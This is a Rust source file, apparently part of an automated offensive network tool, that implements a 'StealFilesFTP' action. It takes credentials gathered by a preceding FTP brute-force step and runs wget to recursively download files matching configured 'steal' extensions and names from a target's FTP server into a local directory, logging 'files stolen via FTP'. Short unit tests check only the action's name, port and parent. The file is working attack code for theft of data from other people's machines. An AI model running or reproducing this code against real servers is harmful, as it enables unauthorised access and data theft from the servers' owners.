use std::sync::Arc;
use std::time::Duration;

use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal files from FTP servers using `wget`.
/// Parent: FTPBruteforce.
pub struct StealFilesFtp;

impl Action for StealFilesFtp {
    fn name(&self) -> &'static str {
        "StealFilesFTP"
    }
    fn port(&self) -> Option<u16> {
        Some(21)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("FTPBruteforce")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "ftp").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let config = state.config();
    let file_exts = &config.steal_file_extensions;
    let file_names = &config.steal_file_names;
    let local_dir = build_output_dir(state, "ftp", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        // Use wget to mirror matching files from FTP
        // Build accept patterns: --accept=".bjorn,.hack,.flag"
        let mut accept_patterns: Vec<String> = file_exts.iter().map(|e| format!("*{e}")).collect();
        accept_patterns.extend(file_names.iter().cloned());
        let accept = accept_patterns.join(",");

        let result = timeout(
            Duration::from_secs(240),
            tokio::process::Command::new("wget")
                .args([
                    "-r",
                    "--no-passive",
                    "-nH",
                    "--cut-dirs=1",
                    &format!("--accept={accept}"),
                    &format!("--user={user}"),
                    &format!("--password={password}"),
                    &format!("ftp://{}:{}/", target.ip, 21),
                    "-P",
                    local_dir.to_str().unwrap_or("."),
                ])
                .output(),
        )
        .await;

        match result {
            Ok(Ok(output)) if output.status.success() => {
                tracing::info!(ip = %target.ip, "files stolen via FTP");
                return ActionOutcome::Success;
            }
            _ => {}
        }
    }

    ActionOutcome::Failed("no files stolen".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn action_name() {
        let action = StealFilesFtp;
        assert_eq!(action.name(), "StealFilesFTP");
    }

    #[test]
    fn action_port() {
        let action = StealFilesFtp;
        assert_eq!(action.port(), Some(21));
    }

    #[test]
    fn action_parent() {
        let action = StealFilesFtp;
        assert_eq!(action.parent(), Some("FTPBruteforce"));
    }
}
